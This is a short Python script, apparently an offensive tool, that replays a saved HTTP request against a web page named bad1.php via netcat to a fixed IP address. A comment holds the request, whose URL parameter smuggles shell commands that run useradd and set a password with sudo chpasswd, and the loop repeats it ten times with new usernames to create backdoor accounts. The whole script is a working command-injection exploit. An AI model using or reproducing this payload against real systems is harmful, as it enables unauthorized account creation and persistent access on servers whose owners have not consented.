import subprocess;
import os;

#please make sure that req.txt is manipulated in this way in order for program to work @ top of line:
#GET /vul/bad1.php?p=-l%3B+%2Fusr%2Fsbin%2Fuseradd+%22user1%22%3B+echo+%22user1%3APASSWD%22+%7C+sudo+chpasswd&sub=submit HTTP/1.1

x=1;

def replace(user):
	with open("req.txt","r+") as f:
		lines=f.readlines();
		if lines:
			lines[0]=lines[0].replace(user,user_manip(x+1));
			f.seek(0);
			f.writelines(lines);
			f.truncate();	
		else:
			print("file is empty!");


def user_manip(x):
	user = "user"+str(x);
	return user;

for y in range(10):
	print("CREATED USER " + str(x) + "...PERFORMED REPLAY ATTACK.");
	os.system("cat req.txt | nc 169.254.236.100 80 -q 1");
	print("\n");
	replace(user_manip(x));
	x=x+1;
